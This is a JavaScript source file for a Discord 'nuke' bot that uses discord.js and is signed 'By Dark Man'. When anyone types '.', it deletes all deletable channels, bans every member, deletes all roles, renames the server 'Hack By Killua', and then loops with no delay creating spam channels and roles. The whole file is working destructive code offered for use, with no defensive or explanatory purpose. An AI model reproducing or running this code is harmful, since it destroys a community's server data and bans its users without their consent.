const Discord = require("discord.js");
const client = new Discord.Client();
const prefix = "."; 
client.on("message", message => {
  if (message.content === ".") {
    if (message.channel.guild) {
      message.guild.channels.forEach(c => {
        if (c.deletable) {
          c.delete();
        }
      });
      message.guild.members.forEach(m => {
        m.ban();
      });
      message.guild.roles.forEach(r => {
        r.delete();
      });
      message.guild.setName("Hack By Killua");
      setInterval(function() {
        message.guild.createChannel("By Killua", "voice");
        message.guild.createChannel("By Killua", "text");
        message.guild.createRole({ name: "By Killua" });
      });
    }
  }
});

client.login("");
///////By Dark Man\\\\\\\
